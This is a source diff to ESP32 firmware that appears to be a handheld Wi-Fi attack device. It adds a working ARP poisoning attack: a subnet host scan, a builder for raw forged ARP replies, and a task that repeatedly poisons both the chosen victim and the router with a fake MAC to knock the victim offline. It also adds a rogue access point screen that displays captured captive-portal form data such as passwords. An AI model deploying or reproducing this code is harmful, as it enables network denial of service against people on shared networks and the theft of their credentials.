@@ -47,6 +47,14 @@
 #include "esp_adc/adc_cali.h"
 #include "esp_adc/adc_cali_scheme.h"
 
+// LwIP (ARP Poisoning)
+#include "lwip/etharp.h"
+#include "lwip/netif.h"
+#include "lwip/pbuf.h"
+#include "lwip/prot/ethernet.h"
+#include "esp_netif.h"
+#include "esp_netif_net_stack.h"
+
 // NimBLE (BLE scanner)
 #include "nimble/nimble_port.h"
 #include "nimble/nimble_port_freertos.h"
@@ -531,6 +539,41 @@ static volatile bool sta_connect_failed = false;
 static volatile int sta_connect_attempt_count = 0;
 static lv_timer_t *sta_connect_check_timer = NULL;
 
+// Rogue AP UI state
+static lv_obj_t *rogue_ap_content = NULL;
+static lv_obj_t *rogue_ap_html_dd = NULL;
+static lv_obj_t *rogue_ap_start_btn = NULL;
+static lv_obj_t *rogue_ap_status_list = NULL;
+static int rogue_ap_html_map[64];
+static int rogue_ap_html_count = 0;
+static QueueHandle_t rogue_ap_event_queue = NULL;
+
+// ARP Poisoning state
+#define ARP_PACKET_SIZE 42
+#define ETH_TYPE_ARP    0x0806
+#define ARP_HWTYPE_ETH  1
+#define ARP_PROTO_IP    0x0800
+#define ARP_OP_REPLY    2
+#define ARP_MAX_HOSTS   32
+
+typedef struct {
+    ip4_addr_t ip;
+    uint8_t mac[6];
+} arp_host_entry_t;
+
+static arp_host_entry_t arp_hosts[ARP_MAX_HOSTS];
+static int arp_host_count = 0;
+static volatile bool arp_ban_active = false;
+static TaskHandle_t arp_ban_task_handle = NULL;
+static uint8_t arp_ban_target_mac[6];
+static ip4_addr_t arp_ban_target_ip;
+static uint8_t arp_ban_gateway_mac[6];
+static ip4_addr_t arp_ban_gateway_ip;
+static volatile bool arp_scan_done = false;
+static lv_obj_t *arp_poison_overlay = NULL;
+static lv_obj_t *arp_poison_status_label = NULL;
+static lv_timer_t *arp_scan_check_timer = NULL;
+
 // BLE Scan UI state
 static lv_obj_t *ble_scan_content = NULL;
 static lv_obj_t *ble_scan_list = NULL;
@@ -836,6 +879,7 @@ static void show_wifi_connect_screen(void);
 static void show_arp_poison_page(void);
 static void show_rogue_ap_page(void);
 static void show_wpa_sec_upload_page(void);
+static void stop_arp_ban(void);
 
 // Radio mode switching (WiFi <-> BLE)
 static bool ensure_wifi_mode(void);
@@ -1082,8 +1126,26 @@ static void evil_twin_add_status_message(const char *message, lv_color_t color) 
             lv_obj_set_style_bg_opa(item, LV_OPA_TRANSP, 0);
             lv_obj_set_style_pad_ver(item, 2, 0);
         }
-        // Scroll to bottom
         lv_obj_scroll_to_y(evil_twin_status_list, LV_COORD_MAX, LV_ANIM_ON);
+    }
+}
+
+// Rogue AP event callback (queues events from wifi_attacks task to main loop)
+static void rogue_ap_ui_event_callback(evil_twin_event_data_t *data) {
+    if (rogue_ap_event_queue && data) {
+        xQueueSend(rogue_ap_event_queue, data, 0);
+    }
+}
+
+static void rogue_ap_add_status_message(const char *message, lv_color_t color) {
+    if (rogue_ap_status_list && lv_obj_is_valid(rogue_ap_status_list)) {
+        lv_obj_t *item = lv_list_add_text(rogue_ap_status_list, message);
+        if (item) {
+            lv_obj_set_style_text_color(item, color, 0);
+            lv_obj_set_style_bg_opa(item, LV_OPA_TRANSP, 0);
+            lv_obj_set_style_pad_ver(item, 2, 0);
+        }
+        lv_obj_scroll_to_y(rogue_ap_status_list, LV_COORD_MAX, LV_ANIM_ON);
     }
 }
 
@@ -2911,6 +2973,42 @@ void app_main(void)
                     }
                     
                     evil_twin_add_status_message(msg, color);
+                }
+            }
+
+            // Process Rogue AP UI events
+            if (rogue_ap_event_queue && rogue_ap_status_list) {
+                evil_twin_event_data_t evt;
+                while (xQueueReceive(rogue_ap_event_queue, &evt, 0) == pdTRUE) {
+                    char msg[384];
+                    lv_color_t color = COLOR_MATERIAL_BLUE;
+                    
+                    switch (evt.event) {
+                        case EVIL_TWIN_EVENT_PORTAL_DEPLOYED:
+                            strcpy(msg, "Rogue AP active");
+                            color = lv_color_make(100, 255, 100);
+                            break;
+                        case EVIL_TWIN_EVENT_CLIENT_CONNECTED:
+                            snprintf(msg, sizeof(msg), "Client connected: %s", evt.mac);
+                            color = lv_color_make(100, 255, 100);
+                            break;
+                        case EVIL_TWIN_EVENT_CLIENT_DISCONNECTED:
+                            snprintf(msg, sizeof(msg), "Client disconnected: %s", evt.mac);
+                            color = lv_color_make(255, 200, 100);
+                            break;
+                        case EVIL_TWIN_EVENT_PORTAL_OPENED:
+                            strcpy(msg, "Client opened captive portal");
+                            color = COLOR_MATERIAL_BLUE;
+                            break;
+                        case EVIL_TWIN_EVENT_FORM_DATA:
+                            snprintf(msg, sizeof(msg), "Form data:\n%s", evt.password);
+                            color = lv_color_make(255, 255, 100);
+                            break;
+                        default:
+                            continue;
+                    }
+                    
+                    rogue_ap_add_status_message(msg, color);
                 }
             }
 
@@ -7432,6 +7530,22 @@ static void create_function_page_base(const char *name)
     portal_info_filename_label = NULL;
     portal_ui_active = false;
 
+    // Rogue AP cleanup
+    rogue_ap_content = NULL;
+    rogue_ap_html_dd = NULL;
+    rogue_ap_start_btn = NULL;
+    rogue_ap_status_list = NULL;
+    rogue_ap_html_count = 0;
+
+    // ARP Poison cleanup
+    stop_arp_ban();
+    arp_poison_overlay = NULL;
+    arp_poison_status_label = NULL;
+    if (arp_scan_check_timer) {
+        lv_timer_del(arp_scan_check_timer);
+        arp_scan_check_timer = NULL;
+    }
+
     if (function_page) {
         lv_obj_del(function_page);
         function_page = NULL;
@@ -7512,6 +7626,22 @@ void show_menu(void)
     portal_info_ssid_label = NULL;
     portal_info_filename_label = NULL;
     portal_ui_active = false;
+    
+    // Rogue AP cleanup
+    rogue_ap_status_list = NULL;
+    rogue_ap_content = NULL;
+    rogue_ap_html_dd = NULL;
+    rogue_ap_start_btn = NULL;
+    rogue_ap_html_count = 0;
+    
+    // ARP Poison cleanup
+    stop_arp_ban();
+    arp_poison_overlay = NULL;
+    arp_poison_status_label = NULL;
+    if (arp_scan_check_timer) {
+        lv_timer_del(arp_scan_check_timer);
+        arp_scan_check_timer = NULL;
+    }
     
     // Delete function page if it exists
     if (function_page) {
@@ -8185,12 +8315,13 @@ static void show_wifi_connect_screen(void)
         }
     }
     
-    // Content container
+    // Content panel (opaque dark bg, same technique as Snifferdog)
     lv_obj_t *content = lv_obj_create(function_page);
-    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
-    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
-    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);
+    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
+    lv_obj_set_style_bg_color(content, lv_color_make(18, 18, 18), 0);
     lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_set_style_radius(content, 0, 0);
     lv_obj_set_style_pad_all(content, 15, 0);
     lv_obj_set_style_pad_gap(content, 10, 0);
     lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
@@ -8208,7 +8339,6 @@ static void show_wifi_connect_screen(void)
     lv_obj_set_style_text_color(ssid_val, COLOR_MATERIAL_BLUE, 0);
     
     if (password_found) {
-        // Show password as label
         lv_obj_t *pass_title = lv_label_create(content);
         lv_label_set_text(pass_title, "Password:");
         lv_obj_set_style_text_font(pass_title, &lv_font_montserrat_14, 0);
@@ -8219,7 +8349,6 @@ static void show_wifi_connect_screen(void)
         lv_obj_set_style_text_font(pass_val, &lv_font_montserrat_16, 0);
         lv_obj_set_style_text_color(pass_val, COLOR_MATERIAL_GREEN, 0);
     } else {
-        // Show password input textarea
         lv_obj_t *pass_title = lv_label_create(content);
         lv_label_set_text(pass_title, "Password:");
         lv_obj_set_style_text_font(pass_title, &lv_font_montserrat_14, 0);
@@ -8235,14 +8364,12 @@ static void show_wifi_connect_screen(void)
         lv_obj_set_style_border_color(wifi_connect_ta, COLOR_MATERIAL_BLUE, 0);
         lv_obj_add_event_cb(wifi_connect_ta, wifi_connect_ta_event_cb, LV_EVENT_CLICKED, NULL);
         
-        // Keyboard (on function_page, not content, so it overlays properly)
         wifi_connect_keyboard = lv_keyboard_create(function_page);
         lv_keyboard_set_textarea(wifi_connect_keyboard, wifi_connect_ta);
         lv_keyboard_set_mode(wifi_connect_keyboard, LV_KEYBOARD_MODE_TEXT_LOWER);
         lv_obj_set_size(wifi_connect_keyboard, lv_pct(100), lv_pct(40));
         lv_obj_align(wifi_connect_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
         
-        // Keyboard styling
         lv_obj_set_style_bg_color(wifi_connect_keyboard, lv_color_make(0, 0, 0), LV_PART_MAIN);
         lv_obj_set_style_text_color(wifi_connect_keyboard, COLOR_MATERIAL_BLUE, LV_PART_MAIN);
         lv_obj_set_style_bg_color(wifi_connect_keyboard, lv_color_make(0, 100, 0), LV_PART_ITEMS);
@@ -8255,22 +8382,18 @@ static void show_wifi_connect_screen(void)
         lv_obj_add_event_cb(wifi_connect_keyboard, wifi_connect_keyboard_event_cb, LV_EVENT_READY, NULL);
         lv_obj_add_event_cb(wifi_connect_keyboard, wifi_connect_keyboard_event_cb, LV_EVENT_CANCEL, NULL);
         
-        // Start with keyboard hidden
         lv_obj_add_flag(wifi_connect_keyboard, LV_OBJ_FLAG_HIDDEN);
     }
     
-    // Status label (for "Connecting..." / "Connected!")
+    // Status label
     wifi_connect_status_label = lv_label_create(content);
     lv_label_set_text(wifi_connect_status_label, "");
     lv_obj_set_style_text_font(wifi_connect_status_label, &lv_font_montserrat_14, 0);
     lv_obj_set_style_text_color(wifi_connect_status_label, COLOR_MATERIAL_BLUE, 0);
     
-    // Connect button
-    wifi_connect_btn = lv_btn_create(content);
+    wifi_connect_btn = lv_btn_create(function_page);
     lv_obj_set_size(wifi_connect_btn, 120, 40);
-    lv_obj_set_style_bg_color(wifi_connect_btn, COLOR_MATERIAL_BLUE, LV_STATE_DEFAULT);
-    lv_obj_set_style_bg_color(wifi_connect_btn, lv_color_lighten(COLOR_MATERIAL_BLUE, 30), LV_STATE_PRESSED);
-    lv_obj_set_style_bg_color(wifi_connect_btn, lv_color_make(60, 60, 60), LV_STATE_DISABLED);
+    lv_obj_align(wifi_connect_btn, LV_ALIGN_BOTTOM_LEFT, 10, -10);
     lv_obj_set_style_border_width(wifi_connect_btn, 0, 0);
     lv_obj_set_style_radius(wifi_connect_btn, 8, 0);
     lv_obj_t *conn_lbl = lv_label_create(wifi_connect_btn);
@@ -8279,10 +8402,10 @@ static void show_wifi_connect_screen(void)
     lv_obj_set_style_text_font(conn_lbl, &lv_font_montserrat_14, 0);
     lv_obj_center(conn_lbl);
     lv_obj_add_event_cb(wifi_connect_btn, wifi_connect_btn_cb, LV_EVENT_CLICKED, NULL);
-    
-    // Next> button (hidden until connected)
-    wifi_connect_next_btn = lv_btn_create(content);
+
+    wifi_connect_next_btn = lv_btn_create(function_page);
     lv_obj_set_size(wifi_connect_next_btn, 120, 40);
+    lv_obj_align(wifi_connect_next_btn, LV_ALIGN_BOTTOM_LEFT, 10, -10);
     lv_obj_set_style_bg_color(wifi_connect_next_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
     lv_obj_set_style_bg_color(wifi_connect_next_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
     lv_obj_set_style_border_width(wifi_connect_next_btn, 0, 0);
@@ -8297,31 +8420,658 @@ static void show_wifi_connect_screen(void)
 }
 
 // ============================================================================
-// Placeholder attack screens
+// ARP Poisoning helpers
 // ============================================================================
+
+static void send_arp_reply(struct netif *lwip_netif,
+                           const uint8_t *dst_mac,
+                           const uint8_t *src_mac,
+                           const uint8_t *sender_mac,
+                           uint32_t sender_ip,
+                           const uint8_t *target_mac,
+                           uint32_t target_ip)
+{
+    uint8_t arp_packet[ARP_PACKET_SIZE];
+    
+    memcpy(&arp_packet[0], dst_mac, 6);
+    memcpy(&arp_packet[6], src_mac, 6);
+    arp_packet[12] = (ETH_TYPE_ARP >> 8) & 0xFF;
+    arp_packet[13] = ETH_TYPE_ARP & 0xFF;
+    
+    arp_packet[14] = (ARP_HWTYPE_ETH >> 8) & 0xFF;
+    arp_packet[15] = ARP_HWTYPE_ETH & 0xFF;
+    arp_packet[16] = (ARP_PROTO_IP >> 8) & 0xFF;
+    arp_packet[17] = ARP_PROTO_IP & 0xFF;
+    arp_packet[18] = 6;
+    arp_packet[19] = 4;
+    arp_packet[20] = (ARP_OP_REPLY >> 8) & 0xFF;
+    arp_packet[21] = ARP_OP_REPLY & 0xFF;
+    
+    memcpy(&arp_packet[22], sender_mac, 6);
+    arp_packet[28] = sender_ip & 0xFF;
+    arp_packet[29] = (sender_ip >> 8) & 0xFF;
+    arp_packet[30] = (sender_ip >> 16) & 0xFF;
+    arp_packet[31] = (sender_ip >> 24) & 0xFF;
+    
+    memcpy(&arp_packet[32], target_mac, 6);
+    arp_packet[38] = target_ip & 0xFF;
+    arp_packet[39] = (target_ip >> 8) & 0xFF;
+    arp_packet[40] = (target_ip >> 16) & 0xFF;
+    arp_packet[41] = (target_ip >> 24) & 0xFF;
+    
+    struct pbuf *p = pbuf_alloc(PBUF_RAW, ARP_PACKET_SIZE, PBUF_RAM);
+    if (p != NULL) {
+        memcpy(p->payload, arp_packet, ARP_PACKET_SIZE);
+        lwip_netif->linkoutput(lwip_netif, p);
+        pbuf_free(p);
+    }
+}
+
+static void arp_ban_task(void *pvParameters)
+{
+    (void)pvParameters;
+    
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        ESP_LOGE(TAG, "ARP ban: STA netif not found");
+        arp_ban_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_netif || !lwip_netif->linkoutput) {
+        ESP_LOGE(TAG, "ARP ban: LwIP netif not usable");
+        arp_ban_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
+    
+    ESP_LOGI(TAG, "ARP ban: Poisoning both victim and router");
+    
+    while (arp_ban_active) {
+        // To VICTIM: "gateway IP is at fake MAC"
+        send_arp_reply(lwip_netif,
+                       arp_ban_target_mac, fake_mac, fake_mac,
+                       arp_ban_gateway_ip.addr,
+                       arp_ban_target_mac, arp_ban_target_ip.addr);
+        
+        vTaskDelay(pdMS_TO_TICKS(50));
+        
+        // To ROUTER: "victim IP is at fake MAC"
+        send_arp_reply(lwip_netif,
+                       arp_ban_gateway_mac, fake_mac, fake_mac,
+                       arp_ban_target_ip.addr,
+                       arp_ban_gateway_mac, arp_ban_gateway_ip.addr);
+        
+        vTaskDelay(pdMS_TO_TICKS(450));
+    }
+    
+    ESP_LOGI(TAG, "ARP ban task stopped");
+    arp_ban_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void stop_arp_ban(void)
+{
+    if (!arp_ban_active && arp_ban_task_handle == NULL) return;
+    arp_ban_active = false;
+    for (int i = 0; i < 20 && arp_ban_task_handle != NULL; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+    if (arp_ban_task_handle != NULL) {
+        vTaskDelete(arp_ban_task_handle);
+        arp_ban_task_handle = NULL;
+    }
+}
+
+static void arp_scan_task(void *pvParameters)
+{
+    (void)pvParameters;
+    
+    arp_host_count = 0;
+    
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        ESP_LOGE(TAG, "ARP scan: STA netif not found");
+        arp_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK || ip_info.ip.addr == 0) {
+        ESP_LOGE(TAG, "ARP scan: No IP assigned");
+        arp_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_netif) {
+        ESP_LOGE(TAG, "ARP scan: LwIP netif not found");
+        arp_scan_done = true;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    uint32_t ip = ntohl(ip_info.ip.addr);
+    uint32_t mask = ntohl(ip_info.netmask.addr);
+    uint32_t network = ip & mask;
+    uint32_t broadcast = network | ~mask;
+    
+    int requests_sent = 0;
+    for (uint32_t target = network + 1; target < broadcast && requests_sent < 254; target++) {
+        ip4_addr_t target_ip;
+        target_ip.addr = htonl(target);
+        etharp_request(lwip_netif, &target_ip);
+        requests_sent++;
+        if (requests_sent % 10 == 0) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+    }
+    
+    ESP_LOGI(TAG, "ARP scan: Sent %d requests, waiting...", requests_sent);
+    vTaskDelay(pdMS_TO_TICKS(3000));
+    
+    // Read ARP table
+    for (int i = 0; i < ARP_TABLE_SIZE && arp_host_count < ARP_MAX_HOSTS; i++) {
+        ip4_addr_t *ip_ret;
+        struct netif *netif_ret;
+        struct eth_addr *eth_ret;
+        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+            arp_hosts[arp_host_count].ip.addr = ip_ret->addr;
+            memcpy(arp_hosts[arp_host_count].mac, eth_ret->addr, 6);
+            arp_host_count++;
+        }
+    }
+    
+    ESP_LOGI(TAG, "ARP scan: Found %d hosts", arp_host_count);
+    arp_scan_done = true;
+    vTaskDelete(NULL);
+}
+
+static void arp_poison_exit_cb(lv_event_t *e)
+{
+    (void)e;
+    stop_arp_ban();
+    if (arp_poison_overlay) {
+        lv_obj_del(arp_poison_overlay);
+        arp_poison_overlay = NULL;
+    }
+    arp_poison_status_label = NULL;
+    if (arp_scan_check_timer) {
+        lv_timer_del(arp_scan_check_timer);
+        arp_scan_check_timer = NULL;
+    }
+    nav_to_menu_flag = true;
+}
+
+static void arp_poison_popup_stop_cb(lv_event_t *e)
+{
+    (void)e;
+    stop_arp_ban();
+    if (arp_poison_overlay) {
+        lv_obj_del(arp_poison_overlay);
+        arp_poison_overlay = NULL;
+    }
+    arp_poison_status_label = NULL;
+    nav_to_menu_flag = true;
+}
+
+static void arp_host_click_cb(lv_event_t *e)
+{
+    int index = (int)(intptr_t)lv_event_get_user_data(e);
+    if (index < 0 || index >= arp_host_count) return;
+    
+    if (arp_ban_active) return;
+    
+    memcpy(arp_ban_target_mac, arp_hosts[index].mac, 6);
+    arp_ban_target_ip.addr = arp_hosts[index].ip.addr;
+    
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) return;
+    
+    esp_netif_ip_info_t ip_info;
+    esp_netif_get_ip_info(sta_netif, &ip_info);
+    arp_ban_gateway_ip.addr = ip_info.gw.addr;
+    
+    bool gateway_found = false;
+    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+        ip4_addr_t *ip_ret;
+        struct netif *netif_ret;
+        struct eth_addr *eth_ret;
+        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+            if (ip_ret->addr == ip_info.gw.addr) {
+                memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
+                gateway_found = true;
+                break;
+            }
+        }
+    }
+    
+    if (!gateway_found) {
+        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+        if (lwip_netif) {
+            ip4_addr_t gw_ip = { .addr = ip_info.gw.addr };
+            etharp_request(lwip_netif, &gw_ip);
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+                ip4_addr_t *ip_ret;
+                struct netif *netif_ret;
+                struct eth_addr *eth_ret;
+                if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+                    if (ip_ret->addr == ip_info.gw.addr) {
+                        memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
+                        gateway_found = true;
+                        break;
+                    }
+                }
+            }
+        }
+        if (!gateway_found) {
+            ESP_LOGW(TAG, "Could not find gateway MAC");
+            return;
+        }
+    }
+    
+    // Start ARP ban task
+    arp_ban_active = true;
+    BaseType_t result = xTaskCreate(arp_ban_task, "arp_ban", 4096, NULL, 5, &arp_ban_task_handle);
+    if (result != pdPASS) {
+        ESP_LOGE(TAG, "Failed to create ARP ban task");
+        arp_ban_active = false;
+        return;
+    }
+    
+    // Show popup overlay with attack status and Stop button
+    arp_poison_overlay = lv_obj_create(lv_scr_act());
+    lv_obj_set_size(arp_poison_overlay, LCD_H_RES, LCD_V_RES);
+    lv_obj_set_pos(arp_poison_overlay, 0, 0);
+    lv_obj_set_style_bg_color(arp_poison_overlay, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_bg_opa(arp_poison_overlay, LV_OPA_80, 0);
+    lv_obj_set_style_border_width(arp_poison_overlay, 0, 0);
+    lv_obj_clear_flag(arp_poison_overlay, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_add_flag(arp_poison_overlay, LV_OBJ_FLAG_CLICKABLE);
+    
+    lv_obj_t *dialog = lv_obj_create(arp_poison_overlay);
+    lv_obj_set_size(dialog, 320, 200);
+    lv_obj_center(dialog);
+    lv_obj_set_style_bg_color(dialog, lv_color_make(30, 30, 30), 0);
+    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_RED, 0);
+    lv_obj_set_style_border_width(dialog, 2, 0);
+    lv_obj_set_style_radius(dialog, 12, 0);
+    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_all(dialog, 15, 0);
+    lv_obj_set_style_pad_gap(dialog, 8, 0);
+    
+    // Title
+    lv_obj_t *title_lbl = lv_label_create(dialog);
+    lv_label_set_text(title_lbl, LV_SYMBOL_WARNING " ARP Poisoning Active");
+    lv_obj_set_style_text_color(title_lbl, COLOR_MATERIAL_RED, 0);
+    lv_obj_set_style_text_font(title_lbl, &lv_font_montserrat_16, 0);
+    lv_obj_set_style_text_align(title_lbl, LV_TEXT_ALIGN_CENTER, 0);
+    
+    // Target info
+    char target_text[128];
+    snprintf(target_text, sizeof(target_text),
+             "Target: %d.%d.%d.%d\n%02X:%02X:%02X:%02X:%02X:%02X",
+             ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
+             ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip),
+             arp_ban_target_mac[0], arp_ban_target_mac[1], arp_ban_target_mac[2],
+             arp_ban_target_mac[3], arp_ban_target_mac[4], arp_ban_target_mac[5]);
+    lv_obj_t *target_lbl = lv_label_create(dialog);
+    lv_label_set_text(target_lbl, target_text);
+    lv_obj_set_style_text_color(target_lbl, lv_color_make(220, 220, 220), 0);
+    lv_obj_set_style_text_font(target_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_align(target_lbl, LV_TEXT_ALIGN_CENTER, 0);
+    
+    // Gateway info
+    char gw_text[80];
+    snprintf(gw_text, sizeof(gw_text), "Gateway: %d.%d.%d.%d",
+             ip4_addr1(&arp_ban_gateway_ip), ip4_addr2(&arp_ban_gateway_ip),
+             ip4_addr3(&arp_ban_gateway_ip), ip4_addr4(&arp_ban_gateway_ip));
+    lv_obj_t *gw_lbl = lv_label_create(dialog);
+    lv_label_set_text(gw_lbl, gw_text);
+    lv_obj_set_style_text_color(gw_lbl, lv_color_make(150, 150, 150), 0);
+    lv_obj_set_style_text_font(gw_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_align(gw_lbl, LV_TEXT_ALIGN_CENTER, 0);
+    
+    // Stop button
+    lv_obj_t *stop_btn = lv_btn_create(dialog);
+    lv_obj_set_size(stop_btn, 140, 40);
+    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_opa(stop_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_text_color(stop_btn, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_border_width(stop_btn, 0, 0);
+    lv_obj_set_style_radius(stop_btn, 8, 0);
+    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
+    lv_label_set_text(stop_lbl, "Stop & Exit");
+    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(stop_btn, arp_poison_popup_stop_cb, LV_EVENT_CLICKED, NULL);
+}
+
+static void arp_poison_show_host_table(void)
+{
+    create_function_page_base("ARP Poison");
+    
+    lv_obj_t *content = lv_obj_create(function_page);
+    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(content, lv_color_make(18, 18, 18), 0);
+    lv_obj_set_style_border_width(content, 0, 0);
+    lv_obj_set_style_radius(content, 0, 0);
+    lv_obj_set_style_pad_all(content, 5, 0);
+    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    
+    // Status / active poisoning label
+    arp_poison_status_label = lv_label_create(content);
+    char header[48];
+    snprintf(header, sizeof(header), "Found %d hosts - tap to poison", arp_host_count);
+    lv_label_set_text(arp_poison_status_label, header);
+    lv_obj_set_style_text_color(arp_poison_status_label, COLOR_MATERIAL_TEAL, 0);
+    lv_obj_set_style_text_font(arp_poison_status_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_align(arp_poison_status_label, LV_TEXT_ALIGN_CENTER, 0);
+    lv_obj_set_width(arp_poison_status_label, lv_pct(100));
+    
+    // Scrollable host list
+    lv_obj_t *host_list = lv_obj_create(content);
+    lv_obj_set_size(host_list, lv_pct(100), LV_SIZE_CONTENT);
+    lv_obj_set_flex_grow(host_list, 1);
+    lv_obj_set_style_bg_color(host_list, lv_color_make(25, 25, 25), 0);
+    lv_obj_set_style_border_color(host_list, lv_color_make(50, 50, 50), 0);
+    lv_obj_set_style_border_width(host_list, 1, 0);
+    lv_obj_set_style_radius(host_list, 8, 0);
+    lv_obj_set_style_pad_all(host_list, 4, 0);
+    lv_obj_set_flex_flow(host_list, LV_FLEX_FLOW_COLUMN);
+    
+    if (arp_host_count == 0) {
+        lv_obj_t *empty_lbl = lv_label_create(host_list);
+        lv_label_set_text(empty_lbl, "No hosts found");
+        lv_obj_set_style_text_color(empty_lbl, lv_color_make(150, 150, 150), 0);
+        lv_obj_set_style_text_font(empty_lbl, &lv_font_montserrat_14, 0);
+    } else {
+        for (int i = 0; i < arp_host_count; i++) {
+            lv_obj_t *row = lv_btn_create(host_list);
+            lv_obj_set_size(row, lv_pct(100), 40);
+            lv_obj_set_style_bg_color(row, lv_color_make(35, 35, 35), LV_STATE_DEFAULT);
+            lv_obj_set_style_bg_opa(row, LV_OPA_COVER, LV_STATE_DEFAULT);
+            lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
+            lv_obj_set_style_text_color(row, lv_color_make(220, 220, 220), 0);
+            lv_obj_set_style_border_width(row, 0, 0);
+            lv_obj_set_style_radius(row, 6, 0);
+            lv_obj_set_style_pad_all(row, 4, 0);
+            
+            char row_text[64];
+            snprintf(row_text, sizeof(row_text), "%d.%d.%d.%d  %02X:%02X:%02X:%02X:%02X:%02X",
+                     ip4_addr1(&arp_hosts[i].ip), ip4_addr2(&arp_hosts[i].ip),
+                     ip4_addr3(&arp_hosts[i].ip), ip4_addr4(&arp_hosts[i].ip),
+                     arp_hosts[i].mac[0], arp_hosts[i].mac[1], arp_hosts[i].mac[2],
+                     arp_hosts[i].mac[3], arp_hosts[i].mac[4], arp_hosts[i].mac[5]);
+            
+            lv_obj_t *row_lbl = lv_label_create(row);
+            lv_label_set_text(row_lbl, row_text);
+            lv_obj_set_style_text_color(row_lbl, lv_color_make(220, 220, 220), 0);
+            lv_obj_set_style_text_font(row_lbl, &lv_font_montserrat_12, 0);
+            lv_obj_center(row_lbl);
+            
+            lv_obj_add_event_cb(row, arp_host_click_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
+        }
+    }
+    
+    // Back button (returns to menu without starting attack)
+    lv_obj_t *exit_btn = lv_btn_create(content);
+    lv_obj_set_size(exit_btn, 120, 36);
+    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_opa(exit_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_text_color(exit_btn, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_border_width(exit_btn, 0, 0);
+    lv_obj_set_style_radius(exit_btn, 8, 0);
+    lv_obj_t *exit_lbl = lv_label_create(exit_btn);
+    lv_label_set_text(exit_lbl, "Back");
+    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_center(exit_lbl);
+    lv_obj_add_event_cb(exit_btn, arp_poison_exit_cb, LV_EVENT_CLICKED, NULL);
+}
+
